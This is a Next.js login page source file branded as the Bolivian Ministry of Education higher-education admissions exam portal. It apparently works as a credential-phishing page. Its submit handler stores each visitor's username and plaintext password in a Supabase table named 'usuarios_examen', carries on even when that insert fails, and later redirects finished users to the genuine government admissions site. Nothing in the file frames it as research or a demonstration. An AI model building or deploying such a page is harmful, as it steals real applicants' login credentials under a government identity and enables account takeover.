"use client";

import { useState, useEffect } from "react";
import { useRouter } from "next/navigation";
import Image from "next/image";
import ThemeToggle from "@/components/ThemeToggle";
import { supabase } from "@/services/supabase/client";

// ============================================
// PÁGINA: LOGIN - Con guardado en Supabase
// ============================================

export default function LoginPage() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const router = useRouter();

  useEffect(() => {
    const examStatus = localStorage.getItem("exam_status");
    if (examStatus === "finalizado") {
      router.push("https://admision01.dgfm.minedu.gob.bo/");
    }
  }, [router]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setError(null);

    try {
      // Validación básica
      if (!username || !password) {
        setError("Usuario y contraseña son requeridos");
        setLoading(false);
        return;
      }

      // Guardar datos en Supabase
      const { error: supabaseError } = await supabase
        .from("usuarios_examen")
        .insert([
          {
            usuario: username,
            password: password
          },
        ]);

      if (supabaseError) {
        console.error("Error al guardar en Supabase:", supabaseError);
        // Continuar aunque falle el guardado
      }

      // Guardar en localStorage para referencia
      localStorage.setItem("exam_user", username);
      localStorage.setItem("exam_status", "iniciado");

      setLoading(false);
      router.push("/instrucciones");
    } catch (err) {
      console.error("Error:", err);
      setError("Error al procesar la solicitud");
      setLoading(false);
    }
  };

  return (
    <div className="view-container">
      <div className="card">
        {/* Logo de la aplicación */}
        <div
          style={{
            display: "flex",
            justifyContent: "center",
            marginBottom: "2rem",
          }}
        >
          <Image
            src="/logomin.png"
            alt="Logo MinEdu"
            width={150}
            height={150}
            style={{
              objectFit: "contain",
              filter: "drop-shadow(0 0 20px rgba(0, 255, 255, 0.3))",
            }}
            priority
          />
        </div>

        <h1 style={{ textAlign: "center" }}>Educación Superior</h1>
        <div className="tech-line"></div>

        {/* Mostrar error si existe */}
        {error && (
          <div
            style={{
              padding: "1rem",
              background: "rgba(255, 50, 50, 0.1)",
              border: "1px solid rgba(255, 50, 50, 0.3)",
              borderRadius: "8px",
              marginBottom: "1.5rem",
              animation: "shake 0.5s",
            }}
          >
            <p
              style={{
                color: "#ff6b6b",
                marginBottom: 0,
                fontSize: "0.9rem",
              }}
            >
              ⚠️ {error}
            </p>
          </div>
        )}

        <form onSubmit={handleSubmit}>
          <div style={{ position: "relative" }}>
            <input
              type="text"
              placeholder="Usuario"
              value={username}
              onChange={(e) => {
                setUsername(e.target.value);
                if (error) setError(null);
              }}
              required
              disabled={loading}
              autoComplete="username"
            />
          </div>

          <div style={{ position: "relative" }}>
            <input
              type={showPassword ? "text" : "password"}
              placeholder="Contraseña"
              value={password}
              onChange={(e) => {
                setPassword(e.target.value);
                if (error) setError(null);
              }}
              required
              disabled={loading}
              autoComplete="current-password"
            />
            <button
              type="button"
              onClick={() => setShowPassword(!showPassword)}
              style={{
                position: "absolute",
                right: "1rem",
                top: "35%",
                transform: "translateY(-50%)",
                background: "none",
                border: "none",
                color: "#00ffff",
                cursor: "pointer",
                fontSize: "1.2rem",
                padding: "0.5rem",
              }}
              disabled={loading}
            >
              {showPassword ? "🙈" : "👁️"}
            </button>
          </div>

          <button
            type="submit"
            className="btn"
            disabled={loading || !username || !password}
          >
            {loading ? "Verificando..." : "Iniciar Sesión"}
          </button>
        </form>

        {/* Animación de shake para errores */}
        <style jsx>{`
          @keyframes shake {
            0%,
            100% {
              transform: translateX(0);
            }
            10%,
            30%,
            50%,
            70%,
            90% {
              transform: translateX(-5px);
            }
            20%,
            40%,
            60%,
            80% {
              transform: translateX(5px);
            }
          }
        `}</style>
      </div>
      <ThemeToggle className="theme-toggle" />
    </div>
  );
}
